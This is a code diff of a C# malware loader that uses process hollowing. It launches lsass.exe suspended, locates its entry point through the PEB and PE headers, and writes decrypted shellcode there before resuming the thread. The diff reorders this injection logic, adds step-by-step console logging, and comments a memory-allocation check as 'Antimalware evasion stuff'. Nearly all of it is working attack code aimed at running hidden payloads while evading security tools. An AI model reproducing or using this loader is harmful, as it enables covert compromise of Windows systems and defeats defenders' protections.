@@ -101,29 +101,7 @@ namespace System.Threading
 
         static void Main(string[] args)
         {
-            STARTUPINFO si = new STARTUPINFO();
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            bool res = CreateProcess(null, "C:\\Windows\\System32\\lsass.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
-
-            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
-            uint tmp = 0;
-            IntPtr hProcess = pi.hProcess;
-            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
-            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
-
-            byte[] addrBuf = new byte[IntPtr.Size];
-            IntPtr nRead = IntPtr.Zero;
-            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
-            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
-
-            byte[] data = new byte[0x200];
-            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
-
-            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
-            uint opthdr = e_lfanew_offset + 0x28;
-            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
-            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
-
+            //Antimalware evasion stuff
             IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
             if (mem == null)
             {
@@ -137,7 +115,7 @@ namespace System.Threading
             {
                 return;
             }
-
+            //
 
             byte[] key = new byte[32] {
                     0xf0,0x59,0xed,0x11,0xe7,0x8d,0x7a,0xaf,0xf6,0xe9,0xb4,0x57,
@@ -229,9 +207,68 @@ namespace System.Threading
                 shellcode[i] = Convert.ToByte(decryptedArray[i], 16);
             }
 
-            WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
+            Console.WriteLine($"[+] Payload decrypted.");
+
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            string process = "C:\\Windows\\System32\\lsass.exe";
+            bool res = CreateProcess(null, process, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+
+            if (res)
+            {
+                Console.WriteLine($"[+] {process} was started in a paused status.");
+            }
+            else
+            {
+                Console.WriteLine($"[X] {process} could not be started.");
+                return;
+            }
+
+            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+            uint tmp = 0;
+            IntPtr hProcess = pi.hProcess;
+            Console.WriteLine($"[+] Got handler for {process}: 0x{(long)hProcess:X}.");
+
+            Console.WriteLine($"[+] Finding Address of Entry Point for process {process}:");
+            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+            Console.WriteLine($"    [*] Got image base in 0x{(long)ptrToImageBase:X}.");
+
+            byte[] addrBuf = new byte[IntPtr.Size];
+            IntPtr nRead = IntPtr.Zero;
+            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+            Console.WriteLine($"    [*] Got svchostbase {process} in 0x{(long)svchostBase:X}.");
+
+
+            byte[] data = new byte[0x200];
+            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+            Console.WriteLine($"    [*] Got e_lfanew offset in 0x{(long)e_lfanew_offset:X}.");
+
+            uint opthdr = e_lfanew_offset + 0x28;
+            Console.WriteLine($"    [*] Got opthdr in 0x{(long)opthdr:X}.");
+
+            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+            Console.WriteLine($"    [*] Got RVA entrypoint in 0x{(long)entrypoint_rva:X}.");
+
+            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+            Console.WriteLine($"[+] Address of Entry Point for process 0x{(long)hProcess:X} found in 0x{(long)addressOfEntryPoint:X}.");
+
+            res = WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
+            if (res)
+            {
+                Console.WriteLine($"[+] Shellcode was copied to process 0x{(long)hProcess:X} memory.");
+            }
+            else
+            {
+                Console.WriteLine($"[X] Shellcode could not be copied to process 0x{(long)hProcess:X} memory.");
+                return;
+            }
 
             ResumeThread(pi.hThread);
+            Console.WriteLine($"[+] Resuming thread 0x{(long)pi.hThread:X} in process 0x{(long)hProcess:X}");
         }
     }
 }
